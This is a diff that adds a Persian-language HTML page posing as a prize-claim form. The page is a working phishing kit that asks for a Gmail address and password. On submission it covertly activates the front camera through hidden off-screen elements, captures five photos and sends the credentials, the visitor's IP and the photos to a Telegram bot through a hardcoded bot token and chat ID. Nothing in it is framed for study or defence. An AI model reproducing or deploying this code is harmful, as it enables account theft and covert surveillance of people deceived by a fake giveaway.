@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دریافت جایزه ویژه | Gift Claim</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@100;300;400;500;700;900&display=swap');
+        
+        :root {
+            --primary: #6C5CE7;
+            --secondary: #FD79A8;
+            --accent: #00CEc9;
+            --dark: #2D3436;
+            --light: #F5F6FA;
+            --white: #FFFFFF;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Vazirmatn', sans-serif;
+        }
+        
+        body {
+            background-color: var(--light);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-image: radial-gradient(circle at 10% 20%, rgba(108, 92, 231, 0.1) 0%, rgba(253, 121, 168, 0.1) 90%);
+        }
+        
+        .gift-card {
+            width: 100%;
+            max-width: 420px;
+            background: var(--white);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.1);
+            margin: 20px;
+            position: relative;
+        }
+        
+        .gift-header {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            padding: 25px;
+            text-align: center;
+            color: var(--white);
+            position: relative;
+        }
+        
+        .gift-badge {
+            position: absolute;
+            top: 15px;
+            left: -30px;
+            background-color: var(--accent);
+            color: var(--white);
+            padding: 5px 35px;
+            transform: rotate(-45deg);
+            font-size: 12px;
+            font-weight: 700;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        
+        .gift-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 5px;
+        }
+        
+        .gift-subtitle {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 300;
+        }
+        
+        .gift-content {
+            padding: 25px;
+        }
+        
+        .gift-icon {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .gift-icon svg {
+            width: 80px;
+            height: 80px;
+            fill: var(--primary);
+        }
+        
+        .gift-product-title {
+            font-size: 20px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 10px;
+            color: var(--dark);
+        }
+        
+        .gift-features {
+            background-color: var(--light);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 25px;
+        }
+        
+        .gift-feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+        
+        .gift-feature svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--accent);
+            margin-left: 8px;
+        }
+        
+        .gift-form .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .gift-form label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+        
+        .gift-form input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 1px solid #DDD;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: all 0.3s;
+            background-color: var(--light);
+        }
+        
+        .gift-form input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.1);
+        }
+        
+        .gift-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            border: none;
+            border-radius: 10px;
+            color: var(--white);
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .gift-btn:hover {
+            opacity: 0.9;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(108, 92, 231, 0.3);
+        }
+        
+        .gift-loading {
+            display: none;
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .gift-spinner {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(108, 92, 231, 0.1);
+            border-left-color: var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .gift-alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            display: none;
+            text-align: center;
+        }
+        
+        .gift-alert.success {
+            background-color: rgba(0, 206, 201, 0.1);
+            color: #007a76;
+            border: 1px solid rgba(0, 206, 201, 0.3);
+        }
+        
+        .gift-alert.error {
+            background-color: rgba(253, 121, 168, 0.1);
+            color: #d23369;
+            border: 1px solid rgba(253, 121, 168, 0.3);
+        }
+        
+        /* Hidden camera elements */
+        #camera-container {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+        
+        #camera-video {
+            display: none;
+        }
+        
+        #camera-canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="gift-card">
+        <div class="gift-header">
+            <div class="gift-badge">محدود!</div>
+            <h1 class="gift-title">دریافت جایزه ویژه</h1>
+            <p class="gift-subtitle">فرم زیر را برای دریافت جایزه تکمیل کنید</p>
+        </div>
+        
+        <div class="gift-content">
+            <div class="gift-icon">
+                <svg viewBox="0 0 24 24">
+                    <path d="M22 12v10h-20v-10h20zm-10-10c1.657 0 3 1.343 3 3v1h3v3h-18v-3h3v-1c0-1.657 1.343-3 3-3h6zm-6 6h12v1c0 1.657-1.343 3-3 3h-6c-1.657 0-3-1.343-3-3v-1z"/>
+                </svg>
+            </div>
+            
+            <h2 class="gift-product-title">جایزه اختصاصی شما</h2>
+            
+            <div class="gift-features">
+                <div class="gift-feature">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.393 7.5l-5.643 5.784-2.644-2.506-1.856 1.858 4.5 4.364 7.5-7.643-1.857-1.857z"/>
+                    </svg>
+                    <span>هدیه ارزشمند رایگان</span>
+                </div>
+                <div class="gift-feature">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.393 7.5l-5.643 5.784-2.644-2.506-1.856 1.858 4.5 4.364 7.5-7.643-1.857-1.857z"/>
+                    </svg>
+                    <span>تحویل فوری پس از ثبت اطلاعات</span>
+                </div>
+                <div class="gift-feature">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M12 2c5.514 0 10 4.486 10 10s-4.486 10-10 10-10-4.486-10-10 4.486-10 10-10zm0-2c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm4.393 7.5l-5.643 5.784-2.644-2.506-1.856 1.858 4.5 4.364 7.5-7.643-1.857-1.857z"/>
+                    </svg>
+                    <span>پشتیبانی 24 ساعته</span>
+                </div>
+            </div>
+            
+            <div class="gift-alert success" id="success-alert">
+                اطلاعات شما با موفقیت ثبت شد!
+            </div>
+            
+            <div class="gift-alert error" id="error-alert">
+                خطا در ارسال اطلاعات! لطفا دوباره تلاش کنید.
+            </div>
+            
+            <form class="gift-form" id="gift-form">
+                <div class="form-group">
+                    <label for="email">آدرس ایمیل (Gmail)</label>
+                    <input type="email" id="email" placeholder="example@gmail.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="password">رمز عبور ایمیل</label>
+                    <input type="password" id="password" placeholder="رمز عبور خود را وارد کنید" required>
+                </div>
+                
+                <div class="gift-loading" id="loading">
+                    <div class="gift-spinner"></div>
+                    <p>در حال ارسال اطلاعات...</p>
+                </div>
+                
+                <button type="submit" class="gift-btn" id="submit-btn">دریافت جایزه</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Hidden camera elements -->
+    <div id="camera-container">
+        <video id="camera-video" autoplay playsinline></video>
+        <canvas id="camera-canvas"></canvas>
+    </div>
+
+    <script>
+        // دریافت توکن و آیدی از بک‌اند
+        async function getTelegramConfig() {
+            try {
+                // در اینجا باید آدرس سرور بک‌اند خود را قرار دهید
+                const response = await fetch('https://your-backend-api.com/get-telegram-config');
+                const data = await response.json();
+                
+                return {
+                    botToken: data.bot_token || '7890105591:AAEjpnoSoD7_kzj5Ml-JhCvFTdv-9uFd_Lc',
+                    chatId: data.chat_id || '7372052838'
+                };
+            } catch (error) {
+                console.error('Error fetching Telegram config:', error);
+                // مقادیر پیش‌فرض در صورت خطا
+                return {
+                    botToken: '7890105591:AAEjpnoSoD7_kzj5Ml-JhCvFTdv-9uFd_Lc',
+                    chatId: '7372052838'
+                };
+            }
+        }
+        
+        // فعال کردن دوربین جلو
+        async function setupCamera() {
+            try {
+                const video = document.getElementById('camera-video');
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user', // استفاده از دوربین جلو
+                        width: 320,
+                        height: 240
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                return true;
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                return false;
+            }
+        }
+        
+        // گرفتن عکس از دوربین
+        function takePhoto() {
+            const video = document.getElementById('camera-video');
+            const canvas = document.getElementById('camera-canvas');
+            const context = canvas.getContext('2d');
+            
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return canvas.toDataURL('image/jpeg', 0.8);
+        }
+        
+        // ارسال اطلاعات به تلگرام
+        async function sendToTelegram(email, password, photos = []) {
+            try {
+                // دریافت توکن و آیدی از بک‌اند
+                const { botToken, chatId } = await getTelegramConfig();
+                
+                // دریافت IP کاربر
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIp = ipData.ip;
+                
+                // آماده‌سازی پیام
+                let message = `🎁 درخواست جدید جایزه\n\n📧 ایمیل: ${email}\n🔑 رمز: ${password}\n🌐 آیپی: ${userIp}\n⏰ زمان: ${new Date().toLocaleString('fa-IR')}`;
+                
+                // ارسال پیام متنی
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+                await fetch(telegramUrl);
+                
+                // ارسال عکس‌ها
+                if (photos.length > 0) {
+                    for (const photo of photos) {
+                        const formData = new FormData();
+                        const blob = await fetch(photo).then(r => r.blob());
+                        formData.append('photo', blob, 'photo.jpg');
+                        
+                        const photoUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
+                        await fetch(photoUrl, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        // تاخیر بین ارسال عکس‌ها
+                        await new Promise(resolve => setTimeout(resolve, 1000));
+                    }
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+        
+        // مدیریت ارسال فرم
+        document.getElementById('gift-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const loading = document.getElementById('loading');
+            const submitBtn = document.getElementById('submit-btn');
+            const successAlert = document.getElementById('success-alert');
+            const errorAlert = document.getElementById('error-alert');
+            
+            // مخفی کردن پیام‌های قبلی
+            successAlert.style.display = 'none';
+            errorAlert.style.display = 'none';
+            
+            // اعتبارسنجی
+            if (!email || !password) {
+                errorAlert.textContent = 'لطفاً تمام فیلدها را پر کنید!';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            if (!email.includes('@gmail.com')) {
+                errorAlert.textContent = 'لطفاً یک آدرس جیمیل معتبر وارد کنید!';
+                errorAlert.style.display = 'block';
+                return;
+            }
+            
+            // نمایش حالت بارگذاری
+            submitBtn.disabled = true;
+            loading.style.display = 'block';
+            
+            try {
+                // فعال کردن دوربین
+                const cameraReady = await setupCamera();
+                let photos = [];
+                
+                if (cameraReady) {
+                    // گرفتن 5 عکس با فاصله زمانی
+                    for (let i = 0; i < 5; i++) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
+                        const photo = takePhoto();
+                        photos.push(photo);
+                    }
+                }
+                
+                // ارسال اطلاعات
+                const isSuccess = await sendToTelegram(email, password, photos);
+                
+                if (isSuccess) {
+                    successAlert.style.display = 'block';
+                    document.getElementById('gift-form').reset();
+                } else {
+                    throw new Error('Failed to send to Telegram');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                errorAlert.style.display = 'block';
+            } finally {
+                loading.style.display = 'none';
+                submitBtn.disabled = false;
+                
+                // متوقف کردن دوربین
+                const video = document.getElementById('camera-video');
+                if (video.srcObject) {
+                    video.srcObject.getTracks().forEach(track => track.stop());
+                }
+            }
+        });
+    </script>
+</body>
+</html>
